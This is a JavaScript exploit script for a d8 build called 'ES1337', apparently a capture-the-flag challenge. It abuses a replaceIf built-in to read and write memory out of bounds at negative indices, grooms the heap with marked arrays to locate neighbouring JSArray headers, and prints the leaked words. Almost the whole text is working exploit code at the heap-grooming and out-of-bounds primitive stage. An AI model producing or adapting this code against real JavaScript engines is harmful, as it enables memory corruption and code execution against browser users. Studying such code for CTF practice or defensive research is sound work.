// Systematic groomer for ES1337 release d8.
// Finds victim negative slots that overlap neighboring JSArray headers.
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
function ftoi_pair(x){ f64[0]=x; return [u32[0]>>>0, u32[1]>>>0]; }
function itof_pair(lo,hi){ u32[0]=lo>>>0; u32[1]=hi>>>0; return f64[0]; }
function hex64(x){ let p=ftoi_pair(x); return '0x'+p[1].toString(16).padStart(8,'0')+p[0].toString(16).padStart(8,'0'); }
function readNeg(arr, idx){ let got=null; arr.replaceIf(idx, (x)=>{ got=x; return false; }, 13.37); return got; }
function writeNeg(arr, idx, val){ arr.replaceIf(idx, ()=>true, val); }

const AMARK = 0x1111;
const BMARK = 0x2222;
const AHEX = '0x'+AMARK.toString(16).padStart(8,'0')+'00000000';
const BHEX = '0x'+BMARK.toString(16).padStart(8,'0')+'00000000';

function mkObj(prefix){
  let x = new Array(4);
  for (let i = 0; i < 4; i++) x[i] = {name: prefix + i};
  return x;
}

function hunt(){
  for (let round = 0; round < 4000; round++) {
    let arena = [];
    for (let i = 0; i < 256; i++) {
      let a = mkObj('A'); a.length = AMARK;
      let b = mkObj('B'); b.length = BMARK;
      let v = [1.1+i, 2.2+i, 3.3+i, 4.4+i];
      arena.push({a,b,v,i});
    }
    for (let ent of arena) {
      let ka = null, kb = null;
      for (let k = -24; k <= -1; k++) {
        let leak = readNeg(ent.v, k);
        if (typeof leak !== 'number') continue;
        let h = hex64(leak);
        if (h === AHEX) ka = k;
        if (h === BHEX) kb = k;
      }
      if (ka !== null && kb !== null) return {...ent, round, ka, kb};
    }
  }
  return null;
}

let r = hunt();
if (!r) { print('FAIL: no adjacency found'); quit(); }
print('FOUND round='+r.round+' idx='+r.i+' ka='+r.ka+' kb='+r.kb);
for (let k = Math.min(r.ka,r.kb)-2; k <= Math.max(r.ka,r.kb)+2; k++) {
  let x = readNeg(r.v, k);
  if (typeof x === 'number') print('slot['+k+'] = ' + hex64(x));
  else print('slot['+k+'] = ' + x);
}
print('a.length=' + r.a.length + ' b.length=' + r.b.length);
print('pre-length words: a=' + hex64(readNeg(r.v, r.ka-1)) + ' b=' + hex64(readNeg(r.v, r.kb-1)));

// Differential test: force b backing store change and observe kb-1 change.
let before = readNeg(r.v, r.kb-1);
r.b.length = 16; for (let i = 4; i < 16; i++) r.b[i] = {grow:i};
let after = readNeg(r.v, r.kb-1);
print('b pre-length before grow=' + hex64(before));
print('b pre-length after  grow=' + hex64(after));
print('same=' + (hex64(before) === hex64(after)));
